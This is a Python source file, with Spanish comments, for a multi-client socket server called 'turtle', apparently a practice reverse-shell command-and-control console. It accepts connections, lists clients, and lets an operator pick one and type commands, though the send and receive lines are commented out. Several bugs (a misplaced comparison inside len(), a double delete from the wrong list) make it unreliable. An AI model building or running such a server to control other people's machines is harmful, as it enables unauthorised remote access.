import socket
import time
from queue import Queue
import threading
import sys

NUMBER_OF_THREADS = 2
JOB_NUMBERS = [1,2]
queue =  Queue()
all_connections = []
all_address = []

#starting params
def create_socket(port1=55550):
    try:
        global s 
        global host
        global port

        s = socket.socket()
        host = "localhost"
        port = port1
    except socket.error as err:
        print("Error al inicializar el socket "+str(err))

# binding socket
def bind_socket():
    try:
        global s 
        global host 
        global port 

        s.bind((host,port))
        s.listen(5)
    except socket.error as err:
        print("Error en binding : "+str(err))
        bind_socket()


#Aceptar conexiones entrantes
def accepting_connection():
    for c in all_connections:
        c.close()
    del all_connections[:]
    del all_address[:]

    while True:
        try:
            con,addr = s.accept()
            s.setblocking(1)

            all_connections.append(con)
            all_address.append(addr)

            print("Connection has been stablished to "+str(addr[0]))
        except:
            print("Error aceptando conexiones nuevas.")



def start_turtle():
    while True:
        cmd = input('turtle> ')
        
        if cmd == 'list':
            list_connections()

        elif 'select' in cmd:
            conn = get_target(cmd)
            if conn is not None:
                send_target_commands(conn)
        else:
            print("Command not recognized")




#List all connections available
def list_connections():
    results = ''
    for i,conn in enumerate(all_connections):
        try:
            conn.send(str.encode(' '))
            conn.recv(201480)
        except:
            del all_connections[i]
            del all_connections[i]
            continue
        results = str(i)+str(all_address[i][0])+":"+str(all_address[i][1])+"\n"

    print("--- Clients --- "+"\n"+results)




def get_target(cmd):
    try:
        target = cmd.replace("select ","")
        target = int(target)

        conn = all_connections[target]
        print("You are now connected to "+all_address[target][0])
        print(str(all_address[target][0])+"> ",end="")
        return conn
    except:
        print("Selection not valid.")
        return None



def send_target_commands(conn):
    while True:
        try:
            cmd = input()
            cmd = cmd.replace(">","")
            if cmd == 'quit':
                break
            if len(str.encode(cmd)>0):
                print("Enviando cmd : "+cmd)
                #conn.send(str.encode(cmd))
                #client_response = str(conn.recv(20048),'utf-8')
                #print(client_response,end="")
        except Exception as ex:
            print("Error sending commands."+str(ex))
            break



def create_workers():
    for _ in range(NUMBER_OF_THREADS):
        threading.Thread(target=work,daemon=True).start()


def work():
    while True:
        x = queue.get()
        if x == 1:
            create_socket()
            bind_socket()
            accepting_connection()
        if x == 2:
            start_turtle()
        queue.task_done()
def create_jobs():
    for x in JOB_NUMBERS:
        queue.put(x)
    queue.join()

create_workers()
create_jobs()